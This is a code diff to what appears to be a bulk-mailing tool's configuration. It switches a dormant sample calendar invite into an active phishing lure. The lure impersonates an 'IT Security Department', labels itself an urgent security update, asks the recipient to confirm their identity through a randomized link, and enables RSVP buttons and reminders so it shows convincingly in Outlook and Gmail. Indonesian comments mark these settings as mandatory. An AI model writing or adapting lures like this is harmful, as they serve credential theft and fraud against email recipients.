@@ -175,18 +175,23 @@ const attachment_EML = {
 // MACRO TEST: CALENDAR INVITE
 // =====================================================================
 const calendar_invite = {
-  active: false, // Set to true to test Macros in calendar invites
-  TIMEZONE: "America/Adak", // Timezone for the event
-  SUMMARY: "Meeting with <NAME> (<COMPANYNAME>)", // Calendar event title
-  DESCRIPTION: "Hello <RANDFNAME>, here is your code: <CAPITAL_RANDSTRING6>", // Event body text
-  LOCATION: "<DOMAIN> HQ", // Event location field
-  METHOD: "REQUEST", // ICS method (REQUEST, PUBLISH, etc.)
-  STATUS: "CONFIRMED", // Event status (CONFIRMED, TENTATIVE)
-  ORGANIZER_CN: "<RANDFULLNAME>", // Name of the event organizer
-  ORGANIZER_EMAIL: "admin@<DOMAIN>", // Email of the event organizer
-  START_DATE: "01/07/2026", // Start date in DD/MM/YYYY format
-  START_TIME: "10:30", // Start time in 24-hour format
-  DURATION_MINUTES: 15 // Duration of the event
+  active: true, // WAJIB TRUE
+  TIMEZONE: "America/New_York", 
+  SUMMARY: "Action Required: Security Update for <NAME>", // Judul di kalender
+  DESCRIPTION: "Dear <NAME>, please confirm your identity using this secure session code: <CAPITAL_RANDSTRING6>. Click the link to proceed: <RANDLINK>", 
+  LOCATION: "Secure Verification Portal",
+  METHOD: "REQUEST", // REQUEST akan memunculkan tombol RSVP (Accept/Maybe/Decline)
+  STATUS: "CONFIRMED",
+  ORGANIZER_CN: "IT Security Department", // Nama pengirim di kalender
+  ORGANIZER_EMAIL: "security-noreply@<DOMAIN>", // Email pengirim di kalender
+  ATTENDEE_CN: "<NAME>", 
+  ATTENDEE_EMAIL: "<EMAIL>",
+  RSVP: true, // WAJIB TRUE agar muncul tombol respon di Outlook/Gmail
+  START_DATE: "05/04/2026", // Format DD/MM/YYYY
+  START_TIME: "10:00", // Format 24 Jam
+  DURATION_MINUTES: 30,
+  REMINDER_MINUTES: 15,
+  REMINDER_TEXT: "Urgent Security Meeting"
 };
 
 const generate_QRCODE = {
